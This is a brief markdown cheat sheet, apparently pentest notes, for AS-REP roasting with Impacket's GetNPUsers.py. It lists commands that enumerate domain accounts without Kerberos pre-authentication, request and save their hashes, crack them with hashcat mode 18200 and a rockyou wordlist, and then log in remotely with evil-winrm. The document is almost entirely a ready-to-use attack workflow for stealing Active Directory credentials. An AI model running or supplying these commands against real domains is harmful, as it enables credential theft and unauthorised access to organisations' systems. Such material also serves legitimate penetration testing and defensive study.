### Impacket - GetNPUsers.py (AS-REP Roasting)

**Tool** - [GetUsers.py]()
**Purpose** - Extract AS-REP hashes for user accounts with ``Do not requrie kerberos pre-authentication`` enabled

---

### Basic Syntax

```bash
GetNPUsers.py [domain]/[username]:[password] -dc-ip <Domain Controller IP> [options]
```

---

### Examples

#### Query All Vulnerable Users (No Credentials)

```bash
impacket-GetNPUsers infosecwarrior.local/ -dc-ip <IP>
```

#### Request AS-REP Hashes

```bash
impacket-GetNPUsers infosecwarrior.local/ -dc-ip <IP> -request
```

#### Save Hashes in Hashcat Format

```bash
impacket-GetNPUsers infosecwarrior.local/ -dc-ip <IP> -request -format hashcat
```

#### Use a User List File

```bash
impacket-GetNPUsers infosecwarrior.local/ -dc-ip <IP> -userfile UserPrincipalName-list.txt
```

#### Anonymous Query (No Password)

```bash
impacket-GetNPUsers infosecwarrior.local/ -dc-ip <IP> -userfile UserPrincipalName-list.txt -no-pass
```

#### Authenticated Query 

```bash
impacket-GetNPUsers infosecwarrior.local/administrator:Password123 -dc-ip <IP> -userfile UserPrincipalName-list.txt
```

#### Save to Output File

```bash
impacket-GetNPUsers infosecwarrior.local/ -dc-ip <IP> -request -outputfile as-rep-hash.txt
```

---

### Crack with Hashcat

#### Crack Hash Mode for AS-REP (kerberos 5)

```bash
hashcat -h | grep -i kerberos
```

should return:

```bash
18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
```

#### Crack AS-REP Hash

```bash
hashcat -a 0 -m 18200 as-rep-hash.txt /opt/rockyou.txt --show
```

---

### Post-Exploitaion Access (if Password is Recovered)

```bash
evil-winrm -i <IP> -u <username> -p <password>
```